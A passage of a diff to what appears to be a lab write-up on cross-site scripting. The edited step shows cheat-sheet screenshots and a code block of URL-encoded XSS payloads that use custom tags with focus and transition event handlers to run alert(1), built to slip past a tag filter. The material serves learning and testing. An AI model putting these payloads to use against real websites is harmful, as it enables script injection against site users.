@@ -45,9 +45,23 @@ I find that three of the payloads returned 200 ok response codes:
 <xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>
 ```
 
-# Step 3 URL encode each payload 
+# Step 3 Create payloads 
 
-I need to add a #x to the payloads to get them to focus on that element with the page is loaded, I will take each on and add it into the searchbar to do the encoding:
+Using the cheat sheet I can click on the links for each of these to view a POC:
+
+![image](https://user-images.githubusercontent.com/83407557/211066414-71ff9942-884b-4a52-b493-5979f09eb2c4.png)
+
+![image](https://user-images.githubusercontent.com/83407557/211066623-a5c1ee2c-63b9-41f8-98f3-857dfac53cf0.png)
+
+Using this I can copy the payload parts of the URLs:
+
+```html
+<xss id%3Dx tabindex%3D1 onfocus%3Dalert(1)><%2Fxss>#x
+  
+<xss id%3Dx tabindex%3D1 onfocusin%3Dalert(1)><%2Fxss>#x
+  
+<xss id%3Dx style%3D"transition%3Aoutline 1s" ontransitionend%3Dalert(1) tabindex%3D1><%2Fxss>#x  
+```
 
 
 ```html
